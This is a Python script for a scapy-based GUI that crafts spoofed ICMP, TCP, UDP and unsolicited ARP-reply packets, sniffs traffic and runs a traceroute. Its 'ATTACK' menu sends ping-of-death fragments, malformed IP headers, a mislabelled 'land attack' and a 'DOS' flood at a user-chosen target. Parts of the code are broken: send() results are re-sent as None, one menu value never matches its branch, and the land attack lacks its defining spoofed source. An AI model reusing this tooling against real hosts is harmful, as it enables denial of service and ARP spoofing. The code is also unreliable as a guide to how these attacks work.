from Tkinter import *
import Tkinter
import sys
from scapy.all import *
from scapy.layers.inet import IP, ICMP,TCP,UDP,ARP,fragment
from io import BytesIO  
import StringIO
from contextlib import contextmanager
import threading
from ScrolledText import *
import os
from scapy.arch.windows import *

  
root=Tk()
root.title("SCAPY GUI")
root.geometry("1024x724")  
topframe=Frame(root)
topframe.pack()
bottomframe=Frame(root) 
bottomframe.pack(side='bottom')
data1=StringVar()
data2=StringVar()
data3=StringVar()
data4=StringVar()
data5=StringVar()
#data entry
label_1=Label(topframe, text="Source")
label_2=Label(topframe, text="Destination")
label_3=Label(topframe, text="MAC Address(for arp)")
label_4=Label(topframe, text="Message")
label_5=Label(topframe, text="COUNT")

entry_1=Entry(topframe,textvariable=data1)
entry_2=Entry(topframe,textvariable=data2)
entry_3=Entry(topframe,textvariable=data3)
entry_4=Entry(topframe,textvariable=data4)
entry_5=Entry(topframe,textvariable=data5)
label_1.grid(row=0)
label_2.grid(row=1)
label_3.grid(row=2)
label_4.grid(row=3)
label_5.grid(row=3,column=2)
#label_4.grid(row=9)

entry_1.grid(row=0,column=1)
entry_2.grid(row=1,column=1)
entry_3.grid(row=2,column=1)
entry_4.grid(row=3,column=1)
entry_5.grid(row=3,column=3)

#drop down box


choice={'ICMP','ARP','TCP','UDP','HTTP'}
Tkvar=StringVar(root)
Tkvar.set('ICMP')
popupMenu=OptionMenu(topframe,Tkvar,*choice)
Label(topframe,text="Type of packet").grid(row=4,column=0)
popupMenu.grid(row=4,column=1)
packetType=''
def change_dropdown(*args):
    if Tkvar.get()=='ICMP':
       global packetType
       packetType='ICMP'
    elif Tkvar.get()=='TCP':
       global packetType
       packetType='TCP'
    elif Tkvar.get()=='UDP':
       global packetType
       packetType='UDP'
    elif Tkvar.get()=='ARP':
       global packetType
       packetType='ARP'   
    
        

Tkvar.trace('w',change_dropdown)
#to send packet
e=''
d=''
def storePacket(pkt):
    wrpcap('scapypackets.pcap', pkt, append=True)
def sendPacket():
    global packetType
    c=data3.get()
    d=data4.get()
    p=''
    
    if  packetType=='ICMP':  
        a=data1.get()
        b=data2.get()
        c=data3.get()
        d=data4.get()
        p=(IP(src=a,dst=b)/ICMP()/d)
        old_stdout, sys.stdout = sys.stdout, BytesIO()
        try:
            p.show()
            output = sys.stdout.getvalue()  # retrieve written string
           
            output2= hexdump(p,dump=True)

        finally:
            sys.stdout = old_stdout
        storePacket(p)
        send(p)

        #ARP packet
    elif  packetType=='ARP':  
        a=data1.get()
        b=data2.get()
        c=data3.get()
        d=data4.get()
        p=(ARP(op=2,psrc=a,pdst=b,hwdst=c))
        old_stdout, sys.stdout = sys.stdout, BytesIO()
        try:
            p.show()
            output = sys.stdout.getvalue()  # retrieve written string
           
            output2= hexdump(p,dump=True)

        finally:
            sys.stdout = old_stdout
        storePacket(p)
        send(p)    

        
    elif packetType=='TCP':
        a=data1.get()
        b=data2.get()
        p=(IP(src=a,dst=b)/TCP()/d)
        old_stdout, sys.stdout = sys.stdout, BytesIO()
        try:
            p.show()
            output = sys.stdout.getvalue() 
            
            output2= hexdump(p,dump=True)
             # retrieve written string
        finally:
            sys.stdout = old_stdout
        storePacket(p)
        send(p)
          
    elif packetType=='UDP':
        a=data1.get()
        b=data2.get()
        p=(IP(src=a,dst=b)/UDP()/d)
        old_stdout, sys.stdout = sys.stdout, BytesIO()
        try:
            p.show()
            output = sys.stdout.getvalue() # retrieve written string
             
            output2= hexdump(p,dump=True)
            
        finally:
            sys.stdout = old_stdout
        storePacket(p)
        send(p)
    
    p.show()
    global e
    global d
    e = output
    d= output2
    printPacket()
label_pktheader=Label(bottomframe, text="Packet Header")
label_pktheader.grid(row=0,column=1)
T = ScrolledText(bottomframe, height=10, width=100)
T.grid(row=1,column=1,padx=50,pady=50)
def printPacket():
    
    global e
    global d
    print(e)
    print (d)    
    
    T.delete('1.0', Tkinter.END)
    T.insert(Tkinter.END, e)
    T.insert(Tkinter.END, d)


    #elif packetType=='ARP':
        #a=data1.get()
        #b=data2.get()
        #op=2
        #p=IP(src=a,dst=b,op)/TCP()
        #send(p)    

button1=Tkinter.Button(topframe,text="send packet",command=sendPacket)
button1.grid(padx=5,pady=5,row=5,column=1)

'''button2=Tkinter.Button(topframe, text="Print Me", command=printSomething)
button2.grid(padx=5,pady=5,row=5,column=1) '''


#sniff the data 
label_pktheader=Label(bottomframe, text="Sniffed Packets")
label_pktheader.grid(row=2,column=1)
T1 = ScrolledText(bottomframe, height=10, width=100)
T1.grid(padx=20,pady=20,row=3,column=1)


#def printToBox():
#    with open('sniff.txt','r') as fp:
#        msg=fp.read()
#        fp.close()
#    T1.insert(END,msg)
    


def sniffPackets(packet):        # custom custom packet sniffer action method
    
        if packet.haslayer(IP):
            pckt_src=packet[IP].src
            pckt_dst=packet[IP].dst
            pckt_ttl=packet[IP].ttl
            old_stdout, sys.stdout = sys.stdout, BytesIO()
            try:
                print ('IP Packet: %s is going to %s and has ttl value %s' % (pckt_src,pckt_dst,pckt_ttl))
                output = sys.stdout.getvalue()  # retrieve written string
            finally:
                sys.stdout = old_stdout
            
            print ('IP Packet: %s is going to %s and has ttl value %s' % (pckt_src,pckt_dst,pckt_ttl))
            s='IP Packet: %s is going to %s and has ttl value %s' % (pckt_src,pckt_dst,pckt_ttl)
            T1.insert(END,s+'\n')
thread=None
switch=False
def stop_sniffing(x):
    global switch
    return switch
        
def startSniffing():
    print ('custom packet sniffer')
    sniff(filter="ip",prn=sniffPackets,stop_filter=stop_sniffing)  
def startSniffBtn():
    global switch
    global thread

    if (thread is None) or (not thread.is_alive()):
        switch=False
        thread=threading.Thread(target=startSniffing)
        thread.start()
    
def stopSniffBtn():
    global switch
    switch=True
    
     
button2=Tkinter.Button(topframe, text="sniff the data ", command=startSniffBtn)
button2.grid(row=6,column=0)
button3=Tkinter.Button(topframe, text="stop sniff the data ", command=stopSniffBtn)
button3.grid(row=6,column=2)
label_pktheader=Label(topframe, text="scapy pcap file stored at :'"+os.getcwd()+"\\scapypackets.pcap'")
label_pktheader.grid(row=7,column=1,padx=10,pady=10)


#traceroute

def traceroute1():
    T1.delete('1.0', END)
    ans, unans = sr(IP(src="192.168.50.122",dst=data2.get(), ttl=(4,25),id=RandShort())/TCP(flags=0x2))

    for snd,rcv in ans:
        print (snd.ttl, rcv.src, isinstance(rcv.payload, TCP))
        old_stdout, sys.stdout = sys.stdout, BytesIO()
        try:
            print (' %s---%s--- %s' % (snd.ttl,rcv.src,isinstance(rcv.payload, TCP)))
            output = sys.stdout.getvalue()  # retrieve written string
        finally:
            sys.stdout = old_stdout
            
        print (' %s---%s--- %s' % (snd.ttl,rcv.src,isinstance(rcv.payload, TCP)))
        s=' %s---%s--- %s' % (snd.ttl,rcv.src,isinstance(rcv.payload, TCP))
        T1.insert(END,s+'\n')

button6=Tkinter.Button(topframe, text="traceroute", command=traceroute1)
button6.grid(row=9,column=1)        





#drop down box


choice3={'Ping of death','Land attack','Malformed packets','DOS ',}
Tkvar3=StringVar(root)
Tkvar3.set('pind of death')
popupMenu=OptionMenu(topframe,Tkvar3,*choice3)
Label(topframe,text="ATTACK").grid(row=4,column=2)
popupMenu.grid(row=4,column=3)
packetType1=''
def attackdrop(*args):
    if Tkvar3.get()=='Ping of death':
       global packetType1
       packetType1='Ping of death'
    elif Tkvar3.get()=='Land attack':
       global packetType1
       packetType1='Land attack'
    elif Tkvar3.get()=='Malformed packets':
       global packetType1
       packetType1='Malformed packets'
    elif Tkvar3.get()=='DOS':
       global packetType1
       packetType1='DOS'

Tkvar3.trace('w',attackdrop)        
def  ATTACK1():
    global packetType1
    b=data2.get()
    e=data5.get()
    q=''
    
    if  packetType1=='Ping of death':       
        b=data2.get()        
        e=int(data5.get())
        q=send( fragment(IP(dst=b)/ICMP()/("X"*60000)),count=e)
        send(q)

    
    elif  packetType1=='Land attack':  
        b=data2.get()        
        e=int(data5.get())
        q=send((IP(dst=b)/TCP(sport=135,dport=135)),count=e)        
        storePacket(q)
        send(q)    

        
    elif packetType1=='Malformed packets':  
        b=data2.get()        
        e=int(data5.get())
        q=send((IP(dst=b, ihl=2, version=3)/ICMP()),count=e)
        storePacket(q)
        send(q)
          
    elif packetType1=='DOS':  
        b=data2.get()        
        e=int(data5.get())
              
        q=send((IP(dst=b)/TCP(sport=135,dport=135)),count=e)        
        storePacket(q)
        send(q)
atk_button=Tkinter.Button(topframe,text="attack",command=ATTACK1)
atk_button.grid(row=5,column=2)  
root.mainloop()